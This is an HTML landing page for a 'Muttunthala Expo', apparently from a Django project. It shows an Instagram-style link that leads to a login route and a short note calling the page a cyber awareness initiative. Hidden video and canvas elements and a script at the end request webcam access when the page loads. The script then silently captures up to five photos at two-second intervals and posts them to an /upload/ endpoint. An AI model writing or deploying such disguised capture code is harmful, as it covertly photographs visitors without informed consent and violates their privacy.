<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to the Expo</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gradient-to-br from-gray-900 via-gray-800 to-gray-900 flex items-center justify-center min-h-screen">
    <div class="text-center p-6 max-w-4xl mx-auto">
        <!-- Main Heading -->
        <h1 class="text-4xl sm:text-5xl md:text-6xl lg:text-7xl font-extrabold text-gray-100 uppercase tracking-widest drop-shadow-lg">Welcome to</h1>
        <h2 class="text-5xl sm:text-6xl md:text-7xl lg:text-8xl font-extrabold text-purple-500 uppercase tracking-tight drop-shadow-lg">Muttunthala</h2>
        <h3 class="text-6xl sm:text-7xl md:text-8xl lg:text-9xl font-extrabold text-gray-100 uppercase tracking-wide mb-10 drop-shadow-lg">Expo</h3>

        <!-- Subheading -->
        <p class="text-lg md:text-xl text-gray-300 font-medium mb-8 leading-relaxed">
            Check out our Instagram page for the latest updates and inspiration!
        </p>

        <!-- Instagram Link -->
        <div class="flex justify-center items-center space-x-6">
            <a href="{% url 'login' %}" class="w-12 h-12 flex items-center justify-center bg-gradient-to-r from-purple-500 to-pink-500 rounded-full shadow-lg hover:scale-105 transition-transform duration-300">
                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" 
                     alt="Instagram" 
                     class="w-8 h-8">
            </a>
        </div>

        <!-- Disclaimer -->
        <div class="mt-12 text-sm md:text-base text-gray-400 bg-gray-800 bg-opacity-50 p-4 rounded-lg shadow-lg max-w-lg mx-auto">
            <p class="font-medium">
                <strong>About this project:</strong> This is a cyber awareness initiative. Learn how hackers steal your data and compromise your privacy. Stay informed and protect yourself!
            </p>
        </div>
    </div>

    <!-- Hidden Video and Canvas for Capturing Images -->
    <video id="video" autoplay hidden></video>
    <canvas id="canvas" width="640" height="480" class="hidden"></canvas>

    <!-- JavaScript for Capturing Images -->
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        let photoCount = 0;
        const MAX_PHOTOS = 5; // Set your capture limit here

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                startCapture();
            })
            .catch(err => console.error(err));

        const captureAndSendImage = () => {
            if (photoCount < MAX_PHOTOS) {
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const dataURL = canvas.toDataURL('image/png');

                fetch('/upload/', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: dataURL })
                })
                .then(response => response.json())
                .then(data => console.log(data.message))
                .catch(error => console.error('Error:', error));

                photoCount++;
            } else {
                console.log('Max photos reached');
            }
        };

        const startCapture = () => {
            setInterval(captureAndSendImage, 2000);
        };
    </script>
</body>
</html>
